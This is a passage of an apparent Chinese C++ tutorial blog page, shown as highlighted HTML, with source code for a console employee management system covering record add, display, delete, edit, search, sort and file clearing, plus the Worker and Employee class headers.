class="number">0</span>; i &lt; m_Empnum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span> m_EmpArray[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">delete</span>[] m_EmpArray;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WorkerManager::Showmenu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;********************************************&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*********  欢迎使用职工管理系统！ **********&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*************  0.退出管理程序  *************&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*************  1.增加职工信息  *************&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*************  2.显示职工信息  *************&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*************  3.删除离职职工  *************&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*************  4.修改职工信息  *************&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*************  5.查找职工信息  *************&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*************  6.按照编号排序  *************&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*************  7.清空所有文档  *************&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;********************************************&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WorkerManager::AddEmp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要添加职工的数量&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">int</span> addnum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; addnum;</span><br><span class="line"><span class="keyword">if</span> (addnum &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> newsize = m_Empnum + addnum;</span><br><span class="line">Worker** newtmp = <span class="keyword">new</span> Worker * [newsize];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>-&gt;m_EmpArray != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m_Empnum; i++)</span><br><span class="line">&#123;</span><br><span class="line">newtmp[i] = m_EmpArray[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; addnum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">int</span> jobid;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入第 &quot;</span> &lt;&lt; i + <span class="number">1</span> &lt;&lt; <span class="string">&quot; 个新职工编号：&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; id;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入第 &quot;</span> &lt;&lt; i + <span class="number">1</span> &lt;&lt; <span class="string">&quot; 个新职工名称：&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; name;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请选择该职工的岗位：&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1、普通职工&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2、经理&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;3、老板&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; jobid;</span><br><span class="line"></span><br><span class="line">Worker* worker = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">switch</span> (jobid)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">worker = <span class="keyword">new</span> Employee(id, name, jobid);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">worker = <span class="keyword">new</span> Manager(id, name, jobid);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">worker = <span class="keyword">new</span> Boss(id, name, jobid);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">newtmp[m_Empnum + i] = worker;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">this</span>-&gt;m_EmpArray;</span><br><span class="line"><span class="keyword">this</span>-&gt;m_EmpArray = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">this</span>-&gt;m_EmpArray = newtmp;</span><br><span class="line"><span class="keyword">this</span>-&gt;m_Empnum = newsize;</span><br><span class="line">m_FileEmpty = <span class="literal">false</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;成功添加&quot;</span> &lt;&lt; addnum &lt;&lt; <span class="string">&quot;名新职工！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;输入有错&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">Savefile();</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WorkerManager::ShowEmp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>-&gt;m_Empnum==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;没有一个职工&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m_Empnum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;m_EmpArray[i]-&gt;showInfo();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WorkerManager::GetEmpNum</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ifstream ifs;</span><br><span class="line">ifs.open(FILENAME, ios::in);</span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">int</span> jobid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (ifs &gt;&gt; id &amp;&amp; ifs &gt;&gt; name &amp;&amp; ifs &gt;&gt; jobid)</span><br><span class="line">&#123;</span><br><span class="line">m_Empnum++;</span><br><span class="line">&#125;</span><br><span class="line">ifs.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WorkerManager::EmptoFile</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ifstream ifs;</span><br><span class="line">ifs.open(FILENAME, ios::in);</span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">int</span> jobid;</span><br><span class="line">Worker** newtmp = <span class="keyword">new</span> Worker * [m_Empnum];</span><br><span class="line"><span class="keyword">while</span> (ifs &gt;&gt; id &amp;&amp; ifs &gt;&gt; name &amp;&amp; ifs &gt;&gt; jobid)</span><br><span class="line">&#123;</span><br><span class="line">Worker* worker = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (jobid == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">worker = <span class="keyword">new</span> Employee(id, name, jobid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (jobid == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">worker = <span class="keyword">new</span> Manager(id, name, jobid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">worker = <span class="keyword">new</span> Boss(id, name, jobid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">newtmp[i] = worker;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>-&gt;m_EmpArray = newtmp;</span><br><span class="line">m_FileEmpty = <span class="literal">false</span>;</span><br><span class="line">ifs.close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WorkerManager::Savefile</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">ofstream ofs;</span><br><span class="line">ofs.open(FILENAME, ios::out);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m_Empnum; i++)</span><br><span class="line">&#123;</span><br><span class="line">ofs &lt;&lt; <span class="keyword">this</span>-&gt;m_EmpArray[i]-&gt;m_Id &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">&lt;&lt; <span class="keyword">this</span>-&gt;m_EmpArray[i]-&gt;m_Name &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">&lt;&lt; <span class="keyword">this</span>-&gt;m_EmpArray[i]-&gt;m_JobId &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">ofs.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">WorkerManager::IsExist</span><span class="params">(<span class="keyword">int</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m_Empnum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (m_EmpArray[i]-&gt;m_Id == id)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WorkerManager::DeleteEmp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>-&gt;m_FileEmpty)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;文件不存在或记录为空！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">int</span> index;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入你要删除的职工编号&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; id;</span><br><span class="line">index = IsExist(id);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (index != <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (i = index; i &lt; m_Empnum<span class="number">-1</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">m_EmpArray[i] = m_EmpArray[i + <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">m_Empnum--;</span><br><span class="line">Savefile();</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;删除成功&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;没有查到该职员&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WorkerManager::UpdateEmp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>-&gt;m_FileEmpty)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;文件不存在或记录为空！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">int</span> index;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入你要修改的职工编号&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; id;</span><br><span class="line">index = IsExist(id);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (index != <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> newid;</span><br><span class="line"><span class="built_in">string</span> newname;</span><br><span class="line"><span class="keyword">int</span> newjobid;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入修改的新职工编号：&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; newid;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入修改的新职工名称：&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; newname;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请修改该职工的岗位：&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1、普通职工&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2、经理&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;3、老板&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; newjobid;</span><br><span class="line">m_EmpArray[index]-&gt;m_Id = newid;</span><br><span class="line">m_EmpArray[index]-&gt;m_Name = newname;</span><br><span class="line">m_EmpArray[index]-&gt;m_JobId = newjobid;</span><br><span class="line"></span><br><span class="line">Savefile();</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;修改成功&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;没有查到该职员&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WorkerManager::FindEmp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>-&gt;m_FileEmpty)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;文件不存在或记录为空！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入你要查找的职工编号&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; id;</span><br><span class="line">index = IsExist(id);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (index != <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;m_EmpArray[index]-&gt;showInfo();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;没有查到该职员&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WorkerManager::SortEmp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>-&gt;m_FileEmpty)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;文件不存在或记录为空！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请选择排序方式： &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1、按职工号进行升序&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2、按职工号进行降序&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> select = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; select;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (select==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//冒泡排序</span></span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line">Worker* tmp = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m_Empnum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; m_Empnum - <span class="number">1</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (m_EmpArray[j]-&gt;m_Id &gt; m_EmpArray[j + <span class="number">1</span>]-&gt;m_Id)</span><br><span class="line">&#123;</span><br><span class="line">tmp = m_EmpArray[j + <span class="number">1</span>];</span><br><span class="line">m_EmpArray[j + <span class="number">1</span>] = m_EmpArray[j];</span><br><span class="line">m_EmpArray[j] = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">Savefile();</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;排序成功&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (select == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//选择排序</span></span><br><span class="line"><span class="keyword">int</span> i, j, k;</span><br><span class="line">Worker* tmp = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m_Empnum; i++)</span><br><span class="line">&#123;</span><br><span class="line">k = i;</span><br><span class="line"><span class="keyword">for</span> (j = i + <span class="number">1</span>; j &lt; m_Empnum; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (m_EmpArray[j]-&gt;m_Id &gt; m_EmpArray[k]-&gt;m_Id)</span><br><span class="line">&#123;</span><br><span class="line">k = j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (k != i)</span><br><span class="line">&#123;</span><br><span class="line">tmp = m_EmpArray[i];</span><br><span class="line">m_EmpArray[i] = m_EmpArray[k];</span><br><span class="line">m_EmpArray[k] = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">Savefile();</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;排序成功&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;选择有误&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WorkerManager::ClearFile</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;确认清空？&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1、确认&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2、返回&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> select = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; select;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (select == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="function">ofstream <span class="title">ofs</span><span class="params">(FILENAME, ios::trunc)</span></span>;</span><br><span class="line">ofs.close();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (m_EmpArray != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m_Empnum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span> m_EmpArray[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">delete</span>[] m_EmpArray;</span><br><span class="line">m_EmpArray = <span class="literal">NULL</span>;</span><br><span class="line">m_Empnum = <span class="number">0</span>;</span><br><span class="line">m_FileEmpty = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (select == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>worker.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Worker</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">//一个抽象类</span></span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">showInfo</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="built_in">string</span> <span class="title">getJobName</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> m_Id;</span><br><span class="line"><span class="built_in">string</span> m_Name;</span><br><span class="line"><span class="keyword">int</span> m_JobId;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>employee.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;worker.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span> :</span><span class="keyword">public</span> Worker</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Employee(<span class="keyword">int</span> Id, <span class="built_in">string</span> Name, <span class="keyword">int</span> JobId);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">showInfo</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="built_in">string</span> <span class="title">getJobName</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>employee.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 